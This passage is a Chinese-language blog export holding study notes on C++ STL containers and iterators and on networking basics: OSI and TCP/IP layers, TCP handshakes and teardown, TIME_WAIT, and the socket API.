容器的函数成员: 函数成员 函数功能 array vector deque begin() 返回指向容器中第一个元素的迭代器。 是 是 是 end() 返回指向容器最后一个元素所在位置后一个位置的迭代器，通常和 begin() 结合使用。 是 是 是 rbegin() 返回指向最后一个元素的迭代器。且++是向左移动 是 是 是 rend() 返回指向第一个元素所在位置前一个位置的迭代器。 是 是 是 assign() 用新元素替换原有内容。 - 是 是 size() 返回实际元素个数。 是 是 是 empty() 判断容器中是否有元素，若无元素，则返回 true；反之，返回 false。 是 是 是 at() 使用经过边界检查的索引访问元素。 是 是 是 resize() 改变实际元素的个数。 - 是 是 front() 返回第一个元素的引用。 是 是 是 back() 返回最后一个元素的引用。 是 是 是 operator[] 使用索引访问元素。 是 是 是 push_back() 在序列的尾部添加一个元素。 - 是 是 insert() 在指定的位置插入一个或多个元素。 - 是 是 emplace_back() 在序列尾部生成一个元素。 - 是 是 pop_back() 移出序列尾部的元素。 - 是 是 erase() 移出一个元素或一段元素。 - 是 是 clear() 移出所有的元素，容器大小变为 0。 - 是 是 swap() 交换两个容器的所有元素。 是 是 是 data() 返回指向容器中第一个元素的指针。 是 是 - listlist容器以双向链表的形式组织元素，在这个序列的任何地方都可以高效地增加或删除元素（时间复杂度都为常数阶 O(1)），但访问容器中任意元素的速度要比前三种容器慢，这是因为 list&lt;T&gt; 必须从第一个元素或最后一个元素开始访问，需要沿着链表移动，直到到达想要的元素。 另外还有一个forward_list&lt;T&gt;（正向链表容器），和 list 容器非常类似，只不过它以单链表的形式组织元素，它内部的元素只能从第一个元素开始访问，是一类比链表容器快、更节省内存的容器。 dequedeque容器不仅尾部插入和删除元素高效，在头部插入或删除元素也同样高效，时间复杂度都是 O(1) 常数阶，但是在容器中某一位置处插入或删除元素，时间复杂度为 O(n) 线性阶； 相比vector，deque可以更方便的在头部增删元素。 deque容器提供的成员函数：其余未展示的函数基本与vector相同 函数成员 函数功能 push_back() 在序列的尾部添加一个元素。 push_front() 在序列的头部添加一个元素。 emplace_front() 在容器头部生成一个元素。和 push_front() 的区别是，该函数直接在容器头部构造元素，省去了复制移动元素的过程。 emplace_back() 在容器尾部生成一个元素。和 push_back() 的区别是，该函数直接在容器尾部构造元素，省去了复制移动元素的过程。 pop_back() 移除容器尾部的元素。 pop_front() 移除容器头部的元素。 arrayarray&lt;T,N&gt;（数组容器）：表示可以存储 N 个 T 类型的元素，是 C++ 本身提供的一种容器。此类容器一旦建立，其长度就是固定不变的，这意味着不能增加或删除元素，只能改变某个元素的值； 12345678#include &lt;array&gt;using namespace std;int main()&#123; // 初始化 std::array&lt;double, 10&gt; v; // 名为v的有10个double类型的元素的array std::array&lt;double, 10&gt; v &#123;&#125;; // 初始化全为0&#125; 除此之外，stack&lt;T&gt; 和 queue&lt;T&gt; 本质上也属于序列容器，只不过它们都是在 deque 容器的基础上改头换面而成，通常更习惯称它们为容器适配器 2.2 排序容器包括 set 集合容器、multiset多重集合容器、map映射容器以及 multimap 多重映射容器。排序容器中的元素默认是由小到大排序好的，即便是插入元素，元素也会插入到适当位置。所以关联容器在查找时具有非常好的性能。multimap、multiset与map、set的唯一不同在于其键可以重复。 STL中可以使用 pair 类模板来创建“键值对”形式的元素。pair类模板还提供有一个 swap() 成员函数，能够互换 2 个 pair 对象的键值对，其操作成功的前提是这 2 个 pair 对象的键和值的类型要相同。 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;utility&gt; // pair 类模板定义在&lt;utility&gt;头文件中#include &lt;string&gt;using namespace std;int main() &#123; // 调用默认构造函数 pair&lt;string, string&gt; pair1; pair1.first = &quot;animal&quot;; pair1.second = &quot;cat&quot;; // 直接使用 2 个元素初始化 pair 对象 pair&lt;string, string&gt; pair2(&quot;animal&quot;,&quot;cat&quot;); pair&lt;string, string&gt; pair2 = &#123;&quot;animal&quot;,&quot;cat&quot;&#125;; // 使用pair初始化pair pair&lt;string, string&gt; pair3(pair2); // 调用移动构造函数 pair&lt;string, string&gt; pair4(make_pair(&quot;animal&quot;, &quot;cat&quot;)); pair&lt;string, string&gt; pair4 = make_pair(&quot;animal&quot;, &quot;cat&quot;); // 输出 cout &lt;&lt; &quot;pair1: &quot; &lt;&lt; pair1.first &lt;&lt; &quot; &quot; &lt;&lt; pair1.second &lt;&lt; endl; // 交换键值对 pair1.swap(pair2); return 0;&#125; map定义在 &lt;map&gt; 头文件中，使用该容器存储的数据，其各个元素的键必须是唯一的（即不能重复），该容器会根据各元素键的大小，默认进行升序排序。 注意，使用insert函数插入元素val时，val 参数表示键值对变量，同时该方法会返回一个 pair 对象，其中 pair.first 表示一个迭代器，pair.second 为一个 bool 类型变量： 如果成功插入 val，则该迭代器指向新插入的 val，bool 值为 true； 如果插入 val 失败，则表明当前 map 容器中存有和 val 的键相同的键值对（用 p 表示），此时返回的迭代器指向 p，bool 值为 false 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;map&gt; //使用 map 容器，必须引入该头文件#include&lt;utility&gt; // 使用pair#include &lt;string&gt;using namespace std;int main()&#123; // -------------------------初始化------------------------- //创建一个空的 map 关联式容器，该容器中存储的键值对，其中键为 string 字符串，值也为 string 字符串类型 map&lt;string, string&gt; mymap; //向 mymap 容器中添加数据 mymap[&quot;animal&quot;] = &quot;cat&quot;; mymap[&quot;plant&quot;] = &quot;flower&quot;; mymap[&quot;planet&quot;] = &quot;earth&quot;; // 定义的同时初始化 map&lt;string, int&gt; myMap&#123; &#123;&quot;animal&quot;,10&#125;,&#123;&quot;plant&quot;,20&#125; &#125;; map&lt;string, int&gt; myMap&#123; make_pair(&quot;animal&quot;,10), make_pair(&quot;plant&quot;,20) &#125;; map&lt;string, int&gt; newMap(myMap) // map默认使用升序排序初始化，所以下面两行代码等价 map&lt;string, int, less&lt;string&gt;&gt; myMap&#123; &#123;&quot;C语言教程&quot;,10&#125;,&#123;&quot;STL教程&quot;,20&#125; &#125;; map&lt;string, int &gt;myMap&#123; &#123;&quot;C语言教程&quot;,10&#125;,&#123;&quot;STL教程&quot;,20&#125; &#125;; // map使用降序排序初始化 map&lt;string, int, greater&lt;string&gt;&gt;myMap&#123; &#123;&quot;C语言教程&quot;,10&#125;,&#123;&quot;STL教程&quot;,20&#125; &#125;; // -------------------------添加键值对------------------------- myMap.emplace(&quot;planet&quot;,&quot;earth&quot;); pair&lt;string, string&gt; a(&quot;planet&quot;,&quot;earth&quot;); myMap.insert(a); // 因为map会自动根据键进行排序，所以插入时没有必要指定插入位置 // -------------------------遍历和索引------------------------- //使用 map 容器的迭代器，遍历 mymap 容器，并输出其中存储的各个键值对 for (auto it = mymap.begin(); it != mymap.end(); ++it) &#123; //输出各个元素中的键和值 cout &lt;&lt; it-&gt;first &lt;&lt; &quot; =&gt; &quot; &lt;&lt; it-&gt;second &lt;&lt; &#x27;\\n&#x27;; &#125; string a = mymap[&quot;animal&quot;]; string a = myMap.at(&quot;animal&quot;); // -------------------------查找------------------------- auto iter = myMap.find(&quot;animal&quot;); //查找键为 &quot;animal&quot; 的键值对 //找到第一个键的值大于或等于 &quot;animal&quot; 的键值对 auto iter = myMap.lower_bound(&quot;animal&quot;); cout &lt;&lt; &quot;lower：&quot; &lt;&lt; iter-&gt;first &lt;&lt; &quot; &quot; &lt;&lt; iter-&gt;second &lt;&lt; endl; //找到第一个键的值大于 &quot;animal&quot; 的键值对 iter = myMap.upper_bound(&quot;animal&quot;); cout &lt;&lt;&quot;upper：&quot; &lt;&lt; iter-&gt;first &lt;&lt; &quot; &quot; &lt;&lt; iter-&gt;second &lt;&lt; endl; // 找到值与 &quot;animal&quot; 的值相等的键值对 auto myPair = myMap.equal_range(&quot;animal&quot;); // equal_range返回一个pair,第一个元素为lower_bound的返回值，第二个元素为upper_bound的返回值 for (auto iter = myPair.first; iter != myPair.second; ++iter) &#123; cout &lt;&lt; iter-&gt;first &lt;&lt; &quot; &quot; &lt;&lt; iter-&gt;second &lt;&lt; endl; &#125; return 0;&#125; set定义在 &lt;set&gt; 头文件中，使用该容器存储的数据，各个元素键和值完全相同，且各个元素的值不能重复（保证了各元素键的唯一性）。该容器会自动根据各个元素的键（其实也就是元素值）的大小进行升序排序。 和 map、multimap 容器不同，使用 set 容器存储的各个键值对，要求键 key 和值 value 必须相等。 123456789101112#include&lt;set&gt;using namespace std;set&lt;string&gt; mySet&#123;&quot;animal&quot;, &quot;plant&quot;&#125;string str = &quot;planet&quot;;auto retpair = mySet.insert(str);auto retpair = mySet.emplace(str);// 删除元素int num = mySet.erase(&quot;animal&quot;); // 根据值定位，返回成功删除的元素个数auto iter = mySet.erase(myset.begin(), --myset.end()); // 根据迭代器定位，返回删除后所指向的迭代器mySet.clear() insert()函数返回的 pair 类型的值，其包含 2 个数据，一个迭代器和一个 bool 值： 当向 set 容器添加元素成功时，该迭代器指向 set 容器新添加的元素，bool 类型的值为 true； 如果添加失败，即证明原 set 容器中已存有相同的元素，此时返回的迭代器就指向容器中相同的此元素，同时 bool 类型的值为 false。 emplace()函数与insert()一样，也能像set容器中添加元素，且效率更高。 2.3 哈希容器C++ 11 新加入 4 种关联式容器，分别是 unordered_set 哈希集合、unordered_multiset 哈希多重集合、unordered_map 哈希映射以及 unordered_multimap 哈希多重映射。和排序容器不同，哈希容器中的元素是未排序的，元素的位置由哈希函数确定。 3. iterator迭代器在 C++ STL 中，对容器中数据的读和写，是通过迭代器完成的，扮演着容器和算法之间的胶合剂，使得算法的设计可以泛化到各种数据结构，隐藏容器的内部差异。 STL标准库为每一种标准容器定义了一种迭代器类型，这意味着，不同容器的迭代器也不同，其功能强弱也有所不同。容器的迭代器的功能强弱，决定了该容器是否支持 STL 中的某种算法。 分类常用的迭代器按功能强弱分为输入迭代器、输出迭代器、正向迭代器、双向迭代器、随机访问迭代器 5 种。主要使用后三种。 1） 正向迭代器 假设 p 是一个正向迭代器，则 p 支持 ++p，p++，*p 操作，还可以被复制或赋值，可以用 &#x3D;&#x3D; 和 !&#x3D; 运算符进行比较。此外，两个正向迭代器可以互相赋值。 2） 双向迭代器 双向迭代器具有正向迭代器的全部功能，除此之外，假设 p 是一个双向迭代器，则还可以进行 –p 或者 p– 操作（即一次向后移动一个位置）。 3） 随机访问迭代器 随机访问迭代器具有双向迭代器的全部功能。除此之外，假设 p 是一个随机访问迭代器，i 是一个整型变量或常量，则 p 还支持以下操作： p+&#x3D;i：使得 p 往后移动 i 个元素。 p-&#x3D;i：使得 p 往前移动 i 个元素。 p+i：返回 p 后面第 i 个元素的迭代器。 p-i：返回 p 前面第 i 个元素的迭代器。 p[i]：返回 p 后面第 i 个元素的引用。 此外，两个随机访问迭代器 p1、p2 还可以用 &lt;、&gt;、&lt;&#x3D;、&gt;&#x3D; 运算符进行比较。另外，表达式 p2-p1 也是有定义的，其返回值表示 p2 所指向元素和 p1 所指向元素的序号之差（也可以说是 p2 和 p1 之间的元素个数减一）。 下表为 C++ 11 标准中不同容器所支持的迭代器类型： 容器 对应的迭代器类型 array 随机访问迭代器 vector 随机访问迭代器 deque 随机访问迭代器 list 双向迭代器 set &#x2F; multiset 双向迭代器 map &#x2F; multimap 双向迭代器 forward_list 前向迭代器 unordered_map &#x2F; unordered_multimap 前向迭代器 unordered_set &#x2F; unordered_multiset 前向迭代器 stack 不支持迭代器 queue 不支持迭代器 注意，容器适配器 stack 和 queue 没有迭代器，它们包含有一些成员函数，可以用来对元素进行访问。 定义 迭代器定义方式 具体格式 正向迭代器 容器类名::iterator 迭代器名; 常量正向迭代器 容器类名::const_iterator 迭代器名; 反向迭代器 容器类名::reverse_iterator 迭代器名; 常量反向迭代器 容器类名::const_reverse_iterator 迭代器名; *迭代器名就可以表示迭代器指向的元素。 反向迭代器和正向迭代器的区别在于： 对正向迭代器进行 ++ 操作时，迭代器会指向容器中的后一个元素； 而对反向迭代器进行 ++ 操作时，迭代器会指向容器中的前一个元素。 注意，以上 4 种定义迭代器的方式，并不是每个容器都适用。有一部分容器同时支持以上 4 种方式，比如 array、deque、vector；而有些容器只支持其中部分的定义方式，例如 forward_list 容器只支持定义正向迭代器，不支持定义反向迭代器 举例1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;vector&gt; //需要引入 vector 头文件using namespace std;int main()&#123; vector&lt;int&gt; v&#123;1,2,3,4,5,6,7,8,9,10&#125;; //v被初始化成有10个元素 //第一种遍历方法：使用索引遍历，size返回元素个数 for (int i = 0; i &lt; v.size(); ++i) cout &lt;&lt; v[i] &lt;&lt;&quot; &quot;; //第二种遍历方法：创建一个正向迭代器，当然，vector也支持其他 3 种定义迭代器的方式 vector&lt;int&gt;::iterator it; for (i = v.begin(); i != v.end(); ++i) // 或者i &lt; v.end() cout &lt;&lt; *i &lt;&lt; &quot; &quot;; //间隔一个输出 i = v.begin(); while (i &lt; v.end()) &#123; cout &lt;&lt; *i &lt;&lt; &quot; &quot;; i += 2; // 随机访问迭代器支持 &quot;+= 整数&quot; 的操作 &#125;&#125; 4. 函数对象如果一个类将 () 运算符重载为成员函数，这个类就称为函数对象类，这个类的对象就是函数对象（又称仿函数）。 5. 适配器可以使一个类的接口（模板的参数）适配成用户指定的形式，从而让原本不能在一起工作的两个类工作在一起。值得一提的是，容器、迭代器和函数都有适配器。 6. 内存分配器为容器类模板提供自定义的内存申请和释放功能，由于往往只有高级用户才有改变内存分配策略的需求，因此内存分配器对于一般用户来说，并不常用。","raw":null,"content":null,"categories":[],"tags":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}]},{"title":"计算机网络","slug":"计算机基础/5. 计算机网络","date":"2021-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.710Z","comments":true,"path":"posts/[object Object]/计算机基础/5. 计算机网络/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/5.%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/undefined","excerpt":"","text":"计算机网络计算机网络模型1.1 OSI参考模型国际标准化组织(ISO)提出的网络体系结构模型，称为开放系统互联参考模型(OSIRM)，通常简称为OSI参考模型。 OSI有七层，自下而上依次为物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。其中数据链路层在概念上常被划分为两个子层：逻辑链路控制子层(LLC)和媒体访问控制子层(MAC)。 数据链路层负责分配MAC地址。MAC地址，或称物理地址，由48比特长，12个十六进制数字组成，0~23位(前6位十六进制)是厂商向IETF（ 国际互联网工程任务组）等机构申请用来标识厂商的代码。地址的24到47位由厂商自行分派，是各个厂商制造的所有网卡的一个唯一编号。 因此一个网卡会有一个全球唯一固定的MAC地址，但可对应多个IP地址。MAC地址的第48位是组播地址标志位。 网络层负责对数据包进行路由选择和存储转发，网络层的协议有: IP、IPX、ICMP、IGMP、ARP、RARP、OSPF 等。网络层数据的单位称为分组或数据包。网络层提供点到点的通信（直接相连的结点之间的通信），仅提供一台机器到另一台机器之间的通信，不会涉及程序或进程的概念。 传输层是第一个端到端，即进程到进程的层次。传输层提供应用进程间的逻辑通信。由于一个主机可同时运行多个进程，因此传输层有复用和分用的功能。传输层的协议有: TCP、 UDP、 SCTP 等。传输层数据的单位称为报文或数据段。 应用层为操作系统或者网络应用程序提供访问网络服务的接口。应用层的协议有: RIP、TELNET、FTP、HTTP、SNMP等。 OSI参考模型 功能 协议 设备 物理层 中继器、集线器 数据链路层 分配MAC地址 网桥、交换机 网络层 对数据包进行路由选择和存储转发（点到点） IP、IPX、ICMP、IGMP、ARP、RARP、OSPF等 路由器 传输层 提供进程间的逻辑通信（端到端） TCP、 UDP、 SCTP等 网关是网络层以上的中继系统。默认网关在网络层以上实现网络互连，实质上是一个网络通向其他网络的IP地址。 1.2 TCP&#x2F;IP模型TCP&#x2F;IP模型由于得到广泛应用而成为事实上的国际标准，从低到高依次为：网络接口层、网际层、传输层和应用层。 OSI七层模型和TCP&#x2F;IP五层模型的对应关系如下： 网际层是TCP&#x2F;IP体系结构的关键部分。它和OSI网络层在功能上非常相似。网际层将分组发往任何网络，并为之独立地选择合适的路由，但它不保证各个分组有序到达，各个分组的有序交付由高层负责。网际层定义了标准的分组格式和协议，即IP协议。当前采用的IP协议是第4版，即IPv4，它的下一-个版本是IPv6。 传输层的功能同样和OSI中的传输层类似，是使发送端和目的端主机上的对等实体可以进行会话。 传输层主要使用以下两种协议: 传输控制协议（Transmission Control Protocol, TCP）。 它是面向连接的，数据传输的单位是报文段，能够提供可靠的交付。 用户数据报协议(User Datagram Protocol, UDP)。 它是无连接的，数据传输的单位是用户数据报，不保证提供可靠的交付，只能提供“尽最大努力交付”。 应用层包含所有的高层协议。如虚拟终端协议(Telnet)、 文件传输协议(FTP)、 域名解析服务(DNS)、电子邮件协议(SMTP)和超文本传输协议(HTTP)。 传输层与socket基本操作2.1 传输层在下图中，展示了IPv4和IPv6。从右向左观察这个图，最右边的4个网络应用使用IPv6，另外的5个网络应用使用IPv4。 最左边的网络应用tpdump直接使用BPF（BSD分组过滤器）或DLPI（数据链路提供者接口）同数据链路层进行通信。ping使用ICMP协议。 UDP用户数据报协议(User Datagram Protocol)，面向数据报文。UDP是一种无连接协议，因为UDP客户与服务器不必存在长期的关系，例如一个UDP客户创建一个套接字并发送一个数据报给一个服务器，然后立即用同一个套接字发送另一个数据报给另外一个服务器。同样，一个UDP服务器可以用同一个UDP套接字从若干不同的客户一连串接受多个数据报。 UDP是不可靠的，不能保证最终到达它们的目的地，不保证各个数据报的先后顺序跨网络保持不变，也不保证每个数据报只到达一次。 UDP既可以使用IPv4,也可以使用IPv6。 TCP传输控制协议(Transmission Control Protocol)，面向字节流。 第一，TCP 是一种面向连接的协议，提供客户与服务器的连接。 第二，TCP提供可靠性。当使用TCP向另一端发送数据时，它要求对端返回一个确认。如果没有收到确认，TCP自动重传数据并等待更长时间。在数次重传失败后，TCP才放弃。 第三，TCP通过给所发送数据的每一个字节关联一个序列号进行排序。UDP提供不可靠的数据报传送，不提供确认、序列号、超时重传等机制。 第四，TCP提供流量控制，而UDP不提供流量控制。TCP总是告诉对端它能够接收多少字节的数据，这称为通告窗口。该窗口在任何时刻都指出接收缓冲区中的可用空间，从而确保发送端发送的数据不会溢出接收缓冲区。 第五，TCP的连接是全双工的。UDP也可以是全双工的。 TCP既可以使用IPv4，也可以使用IPv6。 UDP与TCP的主要区别在于UDP不一定提供可靠的数据传输。事实上，该协议不能保证数据准确无误地到达目的地。UDP在许多方面非常有效，如UDP具有对系统资源要求较少、具有较好的实时性、网络开销小的优点。当某个程序的目标是尽快地传输尽可能多的信息时(其中任意给定数据的重要性相对较低)，可使用UDP。 2.2 TCP连接的建立和终止以下给出了一个基本TCP客户端和服务器程序的套接口函数： 对于服务器端，其先调用socket函数（返回一个套接字），然后套接字与地址、端口绑定（bind），对端口进行监听（listen），调用accept阻塞，等待客户端连接。 这时如果有客户端调用socket函数（返回一个套接字），然后连接服务器（connect），如果连接成功，客户端与服务器端的连接就建立了。客户端发送数据请求，服务器端接收请求并处理请求，然后把响应数据发送给客户端，客户端读取数据，最后关闭连接，一次交互结束。 三次握手建立连接 客户端向服务器发送一个SYN J； 服务器向客户端响应一个SYN K，并对SYN J进行确认ACK J+1； 客户端再向服务器发送一个确认ACK K+1。 从图中可以看出，服务器必须准备好接受外来的连接。这通过socket、bind 和listen函数来完成，称为被动打开。 客户端通过调用connect进行主动打开。这引起客户端向服务器发送了SYN J （表示同步，它告诉服务器客户将在连接中发送的数据的初始序列号）分节，这时connect进入阻塞状态。 服务器监听到连接请求，即收到SYN J分节，调用accept函数接受请求，并向客户端发送SYN K （它告诉客户端服务器将在连接中发送的数据的初始序列号）、ACK J+1分节，这时accept进入阻塞状态。 客户端收到服务器的SYN K、ACK J+1 分节之后，这时connect返回，并对SYN K分节进行确认，再向服务器发送ACK K+1分节； 服务器收到ACK K+1分节时，accept 返回，至此三次握手完毕，连接建立。 总结：客户端的connect在三次握手的第二次返回，而服务器端的accept在三次握手的第三次返回。 &#x3D;&#x3D;TCP为什么不采用二次握手：&#x3D;&#x3D; 采用三次握手是为了防止失效的连接请求报文段突然又传送到服务器，从而发生错误。 比如，客户端第一次发送的连接请求并没有丢失，而是因为网络问题导致延迟到达服务器，服务器以为是客户端又发起的新连接，于是服务器同意连接，并向客服端发回确认，但是此时客户端处于建立连接的状态，所以不予理会，服务器就一直等待客户端发送数据， 导致服务器的资源浪费。 四次挥手释放连接 &#x3D;&#x3D;建立连接需要三次握手，而终止连接需要四次挥手。这是由TCP的半关闭造成的。既然TCP连接是全双工的（数据在两个方向可以同时传递），因此每个方向必须单独地进行关闭。&#x3D;&#x3D; 下图中是客户执行主动关闭，然而不管是客户还是服务器都可以执行主动关闭。通常情况下是客户执行主动关闭，但某些协议如HTTP则是服务器执行主动关闭。 具体步骤: 某个应用进程首先调用close，我们称这一端执行主动关闭。 这一端的TCP于是发送一一个FIN分节，表示数据发送完毕； 另一端接收到FIN分节之后，执行被动关闭，对这个FIN进行ACK确认。它的接收也作为文件结束符传递给接收端应用进程，因为FIN的接收意味着应用进程在相应的连接上再也接收不到额外数据； 一段时间之后，接收到文件结束符的应用进程调用close关闭它的套接口。这导致它的TCP也发送一一个FIN； 接收到这个FIN的原发送端TCP (即执行主动关闭的那一端) 对它进行确认。 这样每个方向上都有一个FIN和ACK，所以一共需要四个分节。我们使用限定词“一般”是因为：有时步骤1)的FIN随数据一起发送；另外，执行被动关闭那一端的TCP在步骤2)和3)发出的ACK与FIN也可以合并成一个分节（当自己已经没有数据要发送了，可以直接关闭连接），这样的话就是三个报文完成连接的释放。 TCP关闭时，每一端都要发送一个FIN。这种情况除了在应用进程调用close时会发生，还会在进程终止时发生。进程终止包括自愿（调用exit或从main函数返回）、不自愿（进程收到一个终止本进程的信号）的情况，进程终止时所有打开的TCP连接上都会发出一个FIN。 &#x3D;&#x3D;TCP释放连接为什么需要四次挥手：&#x3D;&#x3D; 关闭连接时，当收到对方的FIN报文通知时，它仅仅表示对方没有数据发送给你了（单方向），但未必你所有的数据都全部发送给对方了，所以你未必会马上关闭socket，也即你可能还需要发送一些数据给对方之后，再发送FIN报文给对方来表示你没有数据发送给对方了，针对每个FIN报文，都需要一次ack报文，故需要四次挥手。 https://github.com/whuchris/Interview/blob/master/Java/TCP%E5%92%8CUDP%E5%8D%8F%E8%AE%AE.md 握手的过程中可以说没有信息数据的传输，是一个相互应答的过程，所以服务器会将SYN ACK一起发送，但是客户端发送终止连接的时候，很有可能服务器还有一些数据没有发送完，所以服务器只是先答应，但是需要等待数据传输完毕之后再发送FIN报文，ACK和FIN是分开的，因此多了一次。 2.3 TCP状态转换图 TCP连接的建立和终止可以用状态转换图来说明，如图2-5所示。这些状态可使用netstat显示，它是一个在调试客户&#x2F;服务器应用时很有用的工具。 TCP为一个连接定义了11种状态，并且TCP规则规定如何基于当前状态及在该状态下所接收的分节从一个状态转换到另一个状态。举例来说，当某个应用进程在CLOSED状态下执行主动打开时，TCP将发送一个SYN，且新的状态是SYN_ SENT。如果这个TCP接着接收到一个带ACK的SYN，它将发送一个ACK，且新的状态是ESTABLISHED。这个最终状态是绝大多数数据传送发生的状态。 自ESTABLISHED状态引出的两个箭头处理连接的终止。如果某个应用进程在接收到文件结束符之前调用close (主动关闭)，那就转换到FIN _WAIT_1状态。但如果某个应用进程在ESTABLISHED状态期间接收到一个FIN (被动关闭),那就转换到CLOSE WAIT状态。 图2-6给出了一个完整的TCP连接所发生的实际分组交换情况：建立连接、传送数据和终止连接。图中展示了每个端点所经历的TCP状态。从图2-6可见，当客户端应用程序主动请求关闭时，调用close或shutdown关闭连接，这时应用程序发送FIN，然后进入FIN_WAIT_1状态，等待服务器端发送确认包ACK，接受到服务器端的ACK以后，然后客户端进入FIN_WAIT_2状态，等待服务器端调用close, 并发送FIN,当客户端接受到FIN后，发送ACK，进入最终的TIME_WAIT状态。 需要注意的是，执行主动关闭的那一端进入&#x3D;&#x3D;TIME WAIT状态&#x3D;&#x3D;。留在TIME_ WAIT的持续的时间是&#x3D;&#x3D;MSL&#x3D;&#x3D; (最长分节生命周期Maximum Segment Liftime)时间的2倍，也就是2MSL。MSL一般情况下是30秒到2分钟，所以TIME_WAIT的时间一般为1~4分钟。 &#x3D;&#x3D;存在TIME_WAIT状态有两个理由：&#x3D;&#x3D; 实现终止TCP全双工连接的可靠性 假设最终的ACK丢失，服务器将重发最终的FIN，因此客户必须维护状态信息以允许它重发最终的ACK。如果不维护状态信息，它将响应以RST，而服务器则把该分节解释成一个错误。 如果TCP打算执行所有必要的工作以彻底终止某个连接上两个方向的数据流，那么它必须能够处理连接终止序列四个分节中任何一个分节丢失的情况，也即主动关闭的那一端必须进入TIME_WAIT状态，因为它可能不得不重发最终的ACK。 允许老的重复分节在网络中消逝 我们假设12.106.32.254端口1500和206.168.112.219端口21之间有一个TCP连接，我们关闭这个连接后，在以后某个时候又重新建立起相同的IP地址和端口之间的TCP连接。后一个连接称为前一个连接的化身，因为它们的IP地址和端口号是相同的，TCP必须防止来自某个连接的老重复分组在连接终止后再现，从而被误解成属于同一个连接的化身（被误解为属于新建的连接）。要实现这种功能，TCP不能给处于TIME_WAIT状态的连接启动新的化身，既然TME_WAIT状态的持续时间是2MSL，这就足够让某个方向上的分组最多存活MSL秒即被丢弃，另一个方向上的应答最多存活MSL秒也被丢弃，通过实施这个规则，我们就能保证当成功建立一个 TCP连接时，来自该连接先前的化身的老重复分组都已在网络中消逝了。 2.4 socket的基本操作 一个面向连接的客户端socket程序的主要步骤： 加载套接字库 创建套接字socket() 向服务器发送连接请求connect() 和服务器端进行通信 关闭套接字close() socket()函数 1int socket(int domain, int type, int protocol); socket函数在成功时返回一个小的非负整数值，称为套接口描述字(Socket Descriptor)， 简称套接字。这个套接字跟文件描述字相似。 socket函数的三个参数分别为: domain：即协议域，又称为协议族(family)。常用的协议族有: AF_ INET、 AF_ INET6、AF LOCAL（或称AF_ UNIX，UNIX域socket）、AF_ ROUTE等。协议族决定了套接口的地址类型，在通信中必须采用对应的地址，如AF_ INET决定了要用IPv4地址(32位的)与端口号(16位的)的组合、AF_UNIX决定了要用一个绝对路径名作为地址。 type：指定套接口类型。常用的socket类型有: SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_SEQPACKET等。 protocol：指定协议。常用的协议有: IPPROTO_TCP、IPPTOTO_UDP、IPPROTO_SCTP等，它们分别对应TCP传输协议、UDP传输协议、SCTP传输协议。 注意：上面的type 和protocol 并不是可以随意组合的，如SOCK_ STREAM不可以跟IPPROTO_ UDP组合。当protocol为0时，会自动选择type类型对应的默认协议。 bind()函数 bind函数把一个本地协议地址赋予套接口。对于网际协议，协议地址是32位的IPv4地址或128位的IPv6地址与16位的TCP或UDP端口号的组合。 1int bind (int sockfd, const struct sockaddr *addr, socklen_t addrlen) ; 函数的三个参数分别为： sockfd：即套接字，它是通过socket()函数创建的，它唯一标识一个套接口。 addr：一个指向特定于协议的地址结构的指针。 addrlen：指出第二个参数中结构体的长度。 通常服务器在启动的时候都会绑定一个众所周知的地址(如IP地址+端口号)，用于提供服务，客户就可以通过它来连接服务器；而客户端就不用指定，由系统自动分配一个端口号和自身的IP地址组合。**&#x3D;&#x3D;这就是什么三次握手时为服务器端在listen之前会调用bind，而客户端就不调用，而是在connect时由系统生成一个。&#x3D;&#x3D;** listen()函数 1int listen(int sockfd, int backlog) listen函数仅由TCP服务器调用，它做两件事情： 当socket函数创建一个套接口时，它被假设为一个主动套接口，也就是说，它默认是一个将调用connect发起连接的客户套接口。listen函数把一个未连接的套接口转换成一个被动套接口，指示内核应接受指向该套接口的连接请求。调用listen导致套接口从CLOSED状态转换到LISTEN状态。 listen函数的第二个参数backlog规定了内核应该为相应套接口排队的最大连接个数（后台等待连接队列的最大限制值）(包括已完成连接队列与未完成连接队列)。 未完成连接队列。 每个这样的客户对应其中- -项:客户已经发出建立连接请求，且请求已到达服务器，而服务器正在等待完成相应的TCP三路握手过程(服务器已发出第二个分节，等待客户端的第三个分节)。这些套接字处于SYN_ RCVD状态。 已完成连接队列。 每个已完成TCP三路握手过程的客户对应其中- -项。这些套接字处于ESTABLISHED状态。 connect()函数 TCP客户用connect函数来建立与TCP服务器的连接。 1int connect (int sockfd, const struct sockaddr *addr, socklen_t addrlen); connect函数的第一个参数即为客户端的套接字，第二参数为一个指向套接口地址结构的指针，第三个参数为第二个参数中结构体的长度。 accept()函数 accept函数由TCP服务器调用。 1int accept (int sockfd, struct sockaddr addr, socklen_t addrlen) ; accept函数的第一个参 数为服务器的套接字，第二个参数用于返回客户端的协议地址，第三个参数为协议地址的长度。 如果accept成功，那么其返回值是由内核自动生成的一个全新的描述字，代表与所返回客户的TCP连接。 close()函数 close函数用来关闭套接口，并终止TCP连接。 1int close(int fd); close一个TCP套接口的默认行为是把该套接口标记为已关闭，然后立即返回到调用进程。该套接字不能再由调用进程使用，也就是说不能再作为read或write的第-一个参数。注意：close操作只是使相应套接字的引用计数减1，只有当引用计数为0的时候，才会触发TCP客户端向服务器发送终止连接请求（激发TCP的正常连接终止序列,即发送FIN)）。 shutdown()函数 关闭一个socket有2种方法，分别是close与shutdown。 shutdown函数的原型是： 1int shutdown (int sockfd, int howto); sockfd是需要关闭的套接口描述字。参数howto允许为shutdown操作选择以下几种方式: SHUT_RD：关闭连接的读端。也就是该套接字不再接收数据，任何当前在套接字接收缓冲区的数据将被丢弃，但仍可写。进程将不能对该套接字发出任何读操作。调用之后接收到的任何数据将被确认然后无声丢弃掉。注意此时并不发送FIN。 SHUT_WR：关闭连接的写端，进程不能再对此套接字发出写操作，但仍可读。对于TCP的套接字(socket)， 